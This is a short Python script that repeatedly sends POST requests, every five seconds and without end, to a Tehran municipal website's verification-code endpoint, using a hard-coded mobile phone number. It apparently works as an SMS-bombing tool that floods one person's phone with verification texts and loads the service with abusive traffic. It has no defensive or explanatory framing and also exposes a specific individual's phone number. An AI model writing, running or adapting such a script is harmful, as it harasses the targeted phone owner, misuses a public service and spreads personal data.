#Made_By_Defalt

import requests
from colorama import Fore
import time

url = "https://manshahrdaram.tehran.ir/SendVerifyCode"
payload = "phoneNumber=09197290599"
headers = {
    # Add your headers here
}

while True:
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + "Request sent successfully!")
        else:
            print(Fore.RED + "Error occurred while sending the request.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + "Error occurred while sending the request.")

    # Wait for a certain period of time before making the next request
    time.sleep(5)  # Wait for 5 seconds before making the next request
